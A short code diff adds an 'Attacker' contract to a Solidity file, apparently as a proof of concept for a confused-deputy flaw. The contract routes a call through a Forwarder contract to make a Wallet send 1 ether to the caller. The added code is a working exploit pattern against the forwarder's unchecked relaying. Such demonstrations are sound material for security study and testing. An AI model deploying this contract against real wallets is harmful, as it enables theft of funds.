@@ -22,3 +22,24 @@ contract Forwarder {
         require(success, "forward failed");
     }
 }
+
+contract Attacker {
+    address public forwarder;
+    address public wallet;
+
+    constructor(address faddr, address waddr) {
+        forwarder = faddr;
+        wallet = waddr;
+    }
+
+    function attack() public {
+        Forwarder(forwarder).functionCall(
+            wallet,
+            abi.encodeWithSelector(Wallet.sendEther.selector, msg.sender, 1 ether)
+        );
+
+        // payable(msg.sender).call{value: address(this).balance}("");
+    }
+
+    // receive() external payable {}
+}
